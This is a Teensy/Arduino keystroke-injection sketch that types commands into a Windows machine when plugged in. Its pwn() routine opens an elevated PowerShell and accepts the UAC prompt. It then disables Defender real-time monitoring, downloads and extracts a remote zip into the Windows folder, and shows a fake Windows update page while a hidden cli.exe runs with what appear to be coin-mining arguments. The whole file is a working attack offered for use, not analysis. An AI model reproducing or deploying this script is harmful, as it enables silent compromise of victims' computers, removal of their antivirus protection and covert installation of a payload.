const unsigned int ledPin = 17;
const unsigned int delayTime = 1500;
void setup()
{
  delay(1000);



  // Do the shit...
  pwn();

}

// Open an application on Windows via Run
void openapp(String app)
{
  // Windows Key + R to open Run
  key(KEY_R , MODIFIERKEY_RIGHT_GUI);
  delay(delayTime);

  // Type the App you want to open
  Keyboard.print(app);
  key(KEY_ENTER, 0);
  Keyboard.send_now();
  delay(delayTime);
}

void key(int KEY, int MODIFIER)
 {
  Keyboard.set_modifier(MODIFIER);
  Keyboard.set_key1(KEY);
  Keyboard.send_now();
  delay(20);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(20);
 }

void pwn()
{

  key(KEY_D , MODIFIERKEY_RIGHT_GUI);
  delay(delayTime);

  openapp("powershell Start-Process powershell -Verb runAs");
  delay(2000);
  key(KEY_LEFT, 0);
  delay(500);
  key(KEY_ENTER, 0);

  delay(2100);
  Keyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");

  delay(250);
   Keyboard.println("$client = new-object System.Net.WebClient");
   delay(250);
   Keyboard.println("$client.DownloadFile('https://raw.githubusercontent.com/RamalhoSec/regsvr32/master/cli.zip','cli.zip')");
   delay(250);
   Keyboard.println("mkdir cli");
   delay(250);
   Keyboard.println("Expand-Archive cli.zip -DestinationPath \Windows\ ");
   delay(1500);
   Keyboard.println("exit");
   delay(250);
   openapp("cmd");
   delay(1200);
   Keyboard.println("start iexplore -k http://fakeupdate.net/win10u/index.html && PowerShell.exe -WindowStyle Hidden -Command cli.exe -u MGUSER --MGCOIN MGCORE");

}


void loop() {

}
